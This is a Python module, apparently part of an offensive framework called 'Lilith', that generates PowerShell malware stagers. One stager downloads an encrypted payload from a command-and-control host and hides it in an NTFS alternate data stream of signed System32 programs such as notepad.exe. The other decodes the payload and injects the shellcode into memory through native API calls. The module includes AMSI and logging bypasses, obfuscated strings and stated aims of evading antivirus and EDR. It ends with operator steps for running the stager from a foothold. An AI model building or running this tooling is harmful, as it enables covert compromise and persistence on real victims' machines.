"""
Lilith — NTFS Alternate Data Stream (ADS) staging.

Generates two PowerShell artifacts per build:
  ads_plant_<hex>.ps1 — one-shot dropper: downloads the .enc payload from the C2
                        server via SslStream and writes it to an NTFS ADS on a
                        legitimate host file (no standalone payload file on disk)
  ads_load_<hex>.ps1  — offline loader: reads from ADS, two-layer XOR decodes,
                        injects via compiled inject DLL — no network required

Evasion properties:
  - Payload bytes live inside an ADS of a signed system binary
  - `dir` / Explorer hide ADS — needs `dir /r` or Streams.exe to enumerate
  - AV/EDR typically scan only the main file stream on signed system binaries
  - Load stager is self-contained: runs after network access is cut
"""
from __future__ import annotations

import os
import random
import secrets
import string

_DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
)

# Host files: signed, always present, rarely scanned from ADS perspective
_HOST_FILES = [
    r"C:\Windows\System32\notepad.exe",
    r"C:\Windows\System32\mspaint.exe",
    r"C:\Windows\System32\write.exe",
    r"C:\Windows\System32\AtBroker.exe",
    r"C:\Windows\System32\DFDWiz.exe",
    r"C:\Windows\System32\wermgr.exe",
]

_STREAM_WORDS = [
    "cfg", "data", "cache", "sync", "meta", "idx",
    "buf", "res", "ver", "blk", "log", "stat",
]


def _build_plant_ps1(enc_url: str, ads_path: str, ua: str) -> str:
    from builders.stager import (
        _rv, _xenc, _xdec, _amsi_from_bytes, _sbl_bypass,
        _jitter, _xurl, _sslstream_get,
    )

    vraw = _rv()
    url_setup, vurl = _xurl(enc_url)

    path_key = random.randint(15, 200)
    vpk      = _rv()
    vads     = _rv()
    path_enc = _xenc(ads_path, path_key)
    ads_code = f"{vpk}={path_key}\n{vads}={_xdec(path_enc, vpk)}"

    lines = [
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        _jitter(1500, 5000),
        "",
        url_setup,
        _sslstream_get(vurl, vraw, ua),
        "",
        ads_code,
        f"[IO.File]::WriteAllBytes({vads},{vraw})",
    ]
    return "\n".join(lines)


def _build_load_ps1(ads_path: str) -> str:
    from builders.stager import (
        _rv, _rclass, _xenc, _xdec, _split, _amsi_from_bytes, _sbl_bypass,
        _xor2_decode_bytes, _get_inject_dll,
    )

    vraw, vb64, vsc = _rv(), _rv(), _rv()

    path_key = random.randint(15, 200)
    vpk      = _rv()
    vads     = _rv()
    path_enc = _xenc(ads_path, path_key)
    ads_code = f"{vpk}={path_key}\n{vads}={_xdec(path_enc, vpk)}"

    read_var = _rv()
    read_code = f"{read_var}=[IO.File]::ReadAllBytes({vads})"
    decode_code = (
        f"{vb64}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({read_var}))\n"
        + _xor2_decode_bytes(vb64, vsc)
    )

    inject_result = _get_inject_dll()
    if inject_result is not None:
        dll_bytes, cls_name = inject_result
        vdk, vdraw, vddll, vdi, vdasm, vprm = (_rv() for _ in range(6))
        dll_key   = random.randint(1, 254)
        dll_enc   = [b ^ dll_key for b in dll_bytes]
        dll_arr   = ",".join(f"0x{b:02X}" for b in dll_enc)
        cls_split = _split(cls_name)
        inject_lines = [
            f"{vdk}={dll_key}",
            f"{vdraw}=[byte[]]({dll_arr})",
            f"{vddll}=New-Object byte[] {vdraw}.Length",
            f"for({vdi}=0;{vdi} -lt {vdraw}.Length;{vdi}++){{{vddll}[{vdi}]={vdraw}[{vdi}] -bxor {vdk}}}",
            f"{vdasm}=[Reflection.Assembly]::Load({vddll})",
        ]
        prm_lines = [
            f"{vprm}=New-Object object[] 1",
            f"{vprm}[0]=[byte[]]{vsc}",
        ]
        invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('RunRemote').Invoke($null,{vprm})"
    else:
        # Fallback: Add-Type with inline XOR-encoded C# (no dotnet SDK on build host)
        cls = _rclass()
        cs_key = random.randint(10, 200)
        cs_src = (
            f"using System; using System.Runtime.InteropServices; "
            f"public class {cls}{{ "
            "[DllImport(\"kernel32\")] static extern void Sleep(uint ms); "
            "[DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p); "
            "[DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o); "
            "[DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al); "
            "[DllImport(\"ntdll\")] static extern int NtClose(IntPtr h); "
            f"public static void RunRemote(byte[] sc){{"
            "IntPtr hp=(IntPtr)(-1);IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length;"
            "NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04);"
            "System.Runtime.InteropServices.Marshal.Copy(sc,0,b,sc.Length);"
            "IntPtr ep=b;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0;"
            "NtProtectVirtualMemory(hp,ref ep,ref ps,0x20,out o);"
            "IntPtr t;NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,b,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero);"
            "NtClose(t);} }"
        )
        cs_bytes = [ord(c) ^ cs_key for c in cs_src]
        cs_enc   = "[byte[]](" + ",".join(str(b) for b in cs_bytes) + ")"
        vcs, vck = _rv(), _rv()
        inject_lines = [
            f"{vck}={cs_key}",
            f"{vcs}=[Text.Encoding]::ASCII.GetString(({cs_enc}|%{{$_ -bxor {vck}}}))",
            f"Add-Type {vcs}",
        ]
        prm_lines  = []
        invoke_expr = f"[{cls}]::RunRemote({vsc})"

    lines = [
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        *inject_lines,
        "",
        ads_code,
        read_code,
        "",
        decode_code,
        "",
        *prm_lines,
        invoke_expr,
    ]
    return "\n".join(lines)


def build_ads_stager(
    enc_filename: str,
    lhost:        str,
    port:         int,
    url_prefix:   str,
    out_dir:      str,
    host_file:    str | None = None,
    stream_name:  str | None = None,
    use_https:    bool = True,
    user_agent:   str = _DEFAULT_UA,
) -> tuple[str, str]:
    """
    Build an ADS staging pair for enc_filename.

    Returns (plant_path, load_path).
    """
    host = host_file or random.choice(_HOST_FILES)
    stream = stream_name or (random.choice(_STREAM_WORDS) + secrets.token_hex(2))
    ads_path = f"{host}:{stream}"

    scheme  = "https" if use_https else "http"
    enc_url = f"{scheme}://{lhost}:{port}{url_prefix}/{enc_filename}"

    plant_ps1 = _build_plant_ps1(enc_url, ads_path, user_agent)
    load_ps1  = _build_load_ps1(ads_path)

    os.makedirs(out_dir, exist_ok=True)
    tag        = secrets.token_hex(3)
    plant_name = f"ads_plant_{tag}.ps1"
    load_name  = f"ads_load_{tag}.ps1"
    plant_path = os.path.join(out_dir, plant_name)
    load_path  = os.path.join(out_dir, load_name)

    with open(plant_path, "w", encoding="utf-8") as f:
        f.write(plant_ps1)
    with open(load_path, "w", encoding="utf-8") as f:
        f.write(load_ps1)

    print(f"[+] ADS host file   : {host}")
    print(f"    Stream name     : {stream}")
    print(f"    ADS path        : {ads_path}")
    print(f"[+] Plant stager    : {plant_path}")
    print(f"    Delivery URL    : {enc_url}")
    print(f"[+] Load stager     : {load_path}")
    print(f"[*] Step 1 — run plant stager once from foothold (downloads payload into ADS):")
    print(f"    IEX (Get-Content {plant_name} -Raw)")
    print(f"[*] Step 2 — load stager is offline (no network). Use directly or embed in persist.")

    return plant_path, load_path
